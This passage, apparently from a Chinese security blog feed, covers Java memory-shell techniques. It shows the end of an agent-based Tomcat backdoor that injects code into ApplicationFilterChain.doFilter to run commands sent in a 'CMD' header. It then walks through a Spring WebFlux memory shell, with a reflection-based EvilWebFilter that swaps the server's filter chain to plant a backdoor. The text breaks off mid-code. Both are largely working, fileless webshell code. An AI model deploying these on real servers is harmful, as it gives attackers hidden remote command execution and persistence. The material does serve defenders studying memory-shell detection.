class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TomcatTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (loadedClass.getName().equals(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    inst.retransformClasses(loadedClass);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Running JVM...&quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptorList = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vmd : virtualMachineDescriptorList) &#123;</span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (vmd.displayName().contains(<span class="string">&quot;org.apache.catalina.startup.Bootstrap&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/AgentMemoryShell/out/artifacts/AgentMemoryShell_jar/AgentMemoryShell.jar&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">                System.out.println(<span class="string">&quot;Attach successfully...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TomcatTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">classClassPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(classClassPath);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">            method.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;String cmd = httpServletRequest.getHeader(\&quot;CMD\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    Process process = Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    java.io.InputStream input = process.getInputStream();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    StringBuilder sb = new StringBuilder();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    String line = null;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    while ((line = br.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        sb.append(line + \&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    br.close();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    input.close();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713772672628-3c77b64c-f2f0-47b7-b9ce-14d7e779c847.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Agent </tag>
            
            <tag> MemoryShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MemoryShell Of WebFlux</title>
      <link href="/2024/05/19/Spring-WebFlux/"/>
      <url>/2024/05/19/Spring-WebFlux/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring框架中包含的原始Web框架Spring Web MVC是专门为Servlet API和Servlet容器构建的。响应式堆栈Web框架Spring WebFlux是在5.0版本中添加的，它完全非阻塞，支持Reactive Streams背压，运行在Netty、Undertow、Servlet容器等服务器上，它不依赖Servlet-API，但是同样具有Filter，即WebFilter。</p><p>WebFlux型内存马也算是一个变相的Filter类型的内存马，依旧还是通过动态注册WebFilter及映射路由来实现的，但是它的filters并没有存放在常见的filter集合中。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>新建一个SpringBoot项目，WEB选择Spring Reactive WEB。</p><p><img src="/2024/05/19/Spring-WebFlux/1713508782136-e0fab9c3-e439-4905-98c9-8305209ba126.png" alt="image.png"></p><ul><li>创建Handler类，用于请求处理</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.BodyInserters;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerResponse;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Mono&lt;ServerResponse&gt; <span class="title function_">hello</span><span class="params">(ServerRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ServerResponse.ok().contentType(MediaType.TEXT_PLAIN)</span><br><span class="line">                .body(BodyInserters.fromValue(<span class="string">&quot;Hello Webflux!&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建Controller类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RequestPredicates;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RouterFunction;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RouterFunctions;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingRouter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RouterFunction&lt;ServerResponse&gt; <span class="title function_">route</span><span class="params">(GreetingHandler greetingHandler)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RouterFunctions.route(RequestPredicates.GET(<span class="string">&quot;/hello&quot;</span>).and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/19/Spring-WebFlux/1713508910530-71fad0b9-5719-4463-ba12-83b927b72e61.png" alt="image.png"></p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>在GreetingHandler#hello方法中下断点，观察堆栈信息，发现org.springframework.web.reactive.DispatcherHandler#invokeHandler方法调用handle方法，根据URI分发处理handler。</p><p><img src="/2024/05/19/Spring-WebFlux/1713512244450-219aecb1-7e92-4965-89ec-41c85c5671a3.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-WebFlux/1713512304094-be898fef-d208-4d90-8dec-cd2ee83f3cbd.png" alt="image.png"></p><p>由于WebFlux型内存马注入，依旧是需要动态注册一个Filter及映射路由，对于路由创建一般有两种方式：</p><ol><li>通过提供的API进行调用，进而能够动态的创建内存马，例如Spring Controller型内存马，主要就是通过RequestMappingHandlerMapping#registerMapping方法进行动态的注册</li><li>通过反射的方法进行获取类似servlets&#x2F;filters等存放servlet&#x2F;filter的属性，之后将自定义的类添加进入这个属性中</li></ol><p>这里可以利用工具Java-Object-Searcher来查看自定义的WebFilter在Thread的哪个位置，从而确定注入点，自定义一个如下的WebFilter，接着访问路由，观察自定义的WebFilter在Thread的哪个位置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyWebFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain)</span> &#123;</span><br><span class="line">        List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;MyWebFilter&quot;</span>).build());</span><br><span class="line">        List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());</span><br><span class="line">        <span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);</span><br><span class="line">        searcher.setBlacklists(blacklists);</span><br><span class="line">        searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line">        searcher.setMax_search_depth(<span class="number">15</span>);</span><br><span class="line">        searcher.setReport_save_path(<span class="string">&quot;/Users/alphag0/Desktop/&quot;</span>);</span><br><span class="line">        searcher.searchObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;MyWebFilter.....&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> webFilterChain.filter(serverWebExchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先在MyWebFilter中下个断点，观察堆栈信息，发现是从DefaultWebFilterChain#invokeFilter方法中来获取自定义的WebFilter的，因此在前面对象搜索的结果中搜索关键词DefaultWebFilterChain，得到如下的结果，完整的获取到了filter储存的位置。</p><p><img src="/2024/05/19/Spring-WebFlux/1713514797436-a98990c9-0d4b-4eb6-b083-c87a5e02ffb4.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;reactor.netty.resources.DefaultLoopResources$EventLoop&#125; </span><br><span class="line">   ---&gt; group = &#123;java.lang.ThreadGroup&#125; </span><br><span class="line">    ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; </span><br><span class="line">     ---&gt; [<span class="number">2</span>] = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer$<span class="number">1</span>&#125; </span><br><span class="line">      ---&gt; <span class="built_in">this</span>$<span class="number">0</span> = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer&#125; </span><br><span class="line">       ---&gt; handler = &#123;org.springframework.http.server.reactive.ReactorHttpHandlerAdapter&#125; </span><br><span class="line">        ---&gt; httpHandler = &#123;org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler&#125; </span><br><span class="line">         ---&gt; delegate = &#123;org.springframework.web.server.adapter.HttpWebHandlerAdapter&#125; </span><br><span class="line">          ---&gt; delegate = &#123;org.springframework.web.server.handler.ExceptionHandlingWebHandler&#125; </span><br><span class="line">            ---&gt; delegate = &#123;org.springframework.web.server.handler.FilteringWebHandler&#125; </span><br><span class="line">             ---&gt; chain = &#123;org.springframework.web.server.handler.DefaultWebFilterChain&#125; </span><br><span class="line">              ---&gt; allFilters = &#123;java.util.List&lt;org.springframework.web.server.WebFilter&gt;&#125; </span><br><span class="line">               ---&gt; [<span class="number">0</span>] = &#123;com.example.webfluxmemoryshell.index.MyWebFilter&#125;</span><br></pre></td></tr></table></figure><p>从上文搜索结果中可以看到，所有filter都被储存在了chain属性里，然后chain属性是被存在FilteringWebHandler里面，要注入的话就得添加一个恶意的chain进去，至于为什么不添加一个Filter到allFilters属性中，可以参考<a href="https://xz.aliyun.com/t/11331?time__1311=mqmx0DyDBD9DniDcDBqQqO4+xpLrTWFKqwrID&alichlgref=https://www.google.com.hk/#toc-4:~:text=%22request%22">从CVE-2022-22947到Spring WebFlux内存马与哥斯拉</a>%3B-,Spring%20WebFilter%E5%86%85%E5%AD%98%E9%A9%AC,-%E5%89%8D%E9%9D%A2%E6%8F%90%E5%88%B0Controller)。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.embedded.netty.NettyWebServer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DataBuffer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DefaultDataBufferFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.adapter.HttpWebHandlerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.DefaultWebFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.ExceptionHandlingWebHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.FilteringWebHandler;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Flux;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilWebFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (exchange.getRequest().getURI().getPath().startsWith(<span class="string">&quot;/evil/&quot;</span>)) &#123;</span><br><span class="line">            inject();</span><br><span class="line">            Flux&lt;DataBuffer&gt; response = getPost(exchange);</span><br><span class="line">            <span class="type">ServerHttpResponse</span> <span class="variable">serverHttpResponse</span> <span class="operator">=</span> exchange.getResponse();</span><br><span class="line">            serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);</span><br><span class="line">            <span class="keyword">return</span> serverHttpResponse.writeWith(response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getThreads</span> <span class="operator">=</span> Thread.class.getDeclaredMethod(<span class="string">&quot;getThreads&quot;</span>);</span><br><span class="line">            getThreads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">threads</span> <span class="operator">=</span> getThreads.invoke(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Array.getLength(threads); i++) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Array.get(threads, i);</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getClass().getName().contains(<span class="string">&quot;NettyWebServer&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">NettyWebServer</span> <span class="variable">nettyWebServer</span> <span class="operator">=</span> (NettyWebServer) getFieldValue(thread, <span class="string">&quot;this$0&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">ReactorHttpHandlerAdapter</span> <span class="variable">handler</span> <span class="operator">=</span> (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, <span class="string">&quot;handler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">httpHandler</span> <span class="operator">=</span> getFieldValue(handler,<span class="string">&quot;httpHandler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">HttpWebHandlerAdapter</span> <span class="variable">httpWebHandlerAdapter</span> <span class="operator">=</span> (HttpWebHandlerAdapter) getFieldValue(httpHandler,<span class="string">&quot;delegate&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">ExceptionHandlingWebHandler</span> <span class="variable">exceptionHandlingWebHandler</span> <span class="operator">=</span> (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,<span class="string">&quot;delegate&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                    <span class="type">FilteringWebHandler</span> <span class="variable">filteringWebHandler</span> <span class="operator">=</span> (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,<span class="string">&quot;delegate&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                    <span class="type">DefaultWebFilterChain</span> <span class="variable">defaultWebFilterChain</span> <span class="operator">=</span> (DefaultWebFilterChain) getFieldValue(filteringWebHandler,<span class="string">&quot;chain&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    List&lt;WebFilter&gt; allFilters = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(defaultWebFilterChain.getFilters());</span><br><span class="line">                    allFilters.add(<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">EvilWebFilter</span>());</span><br><span class="line">                    <span class="type">DefaultWebFilterChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebFilterChain</span>((WebHandler) handler, allFilters);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> filteringWebHandler.getClass().getDeclaredField(<span class="string">&quot;chain&quot;</span>);</span><br><span class="line">                    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">modifersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">                    modifersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">                    f.set(filteringWebHandler, newChain);</span><br><span class="line">                    modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName, <span class="type">boolean</span> superClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">if</span>(superClass)&#123;</span><br><span class="line">            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Flux&lt;DataBuffer&gt; <span class="title function_">getPost</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> 